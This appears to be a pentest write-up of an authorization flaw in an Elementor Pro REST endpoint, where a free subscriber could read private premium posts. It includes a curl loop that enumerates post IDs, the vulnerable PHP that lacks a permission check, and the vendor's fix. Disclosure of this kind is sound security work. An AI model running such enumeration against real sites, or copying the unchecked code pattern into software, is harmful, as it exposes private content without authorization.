## The Setup

This one came from a client pentest. The target was a membership site built on WordPress + Elementor Pro. Members purchased access to premium content.

My test account was a free subscriber — the lowest privilege tier.

## Discovery

While crawling the site with Burp, I noticed Elementor Pro making REST API calls:

```
GET /wp-json/elementor/v1/templates/1523
Authorization: Bearer <subscriber_token>
```

The response returned full post HTML including text, images, and embedded data for template #1523 — a public page template.

I wondered: what happens with a private post ID?

## Exploitation

WordPress assigns sequential post IDs. I used a quick loop to enumerate:

```bash
for i in $(seq 1 200); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.com/wp-json/elementor/v1/templates/$i")
  echo "$i: $STATUS"
done
```

Post IDs returning 200 even though they were private posts: **12, 47, 88, 134, 156...**

Every piece of premium content on the site was accessible to a free subscriber.

## Root Cause

```php
// elementor-pro/modules/editor/rest-api.php
public function get_item( $request ) {
    $id   = $request->get_param('id');
    $post = get_post( $id );
    // No current_user_can('read_post', $id) check
    return $this->prepare_item_for_response( $post, $request );
}
```

WordPress's `get_post()` returns the post regardless of visibility. The check for whether the *current user* can *read that post* was simply absent.

## Business Impact

For a membership site selling access to premium content — the entire business model could be bypassed by anyone with a free account.

## Fix

Elementor Pro v3.21.1 added a single line:

```php
if ( ! current_user_can( 'read_post', $id ) ) {
    return new WP_Error( 'rest_forbidden', 'Sorry, you are not allowed to read this post.' );
}
```

Sometimes that's all it takes.
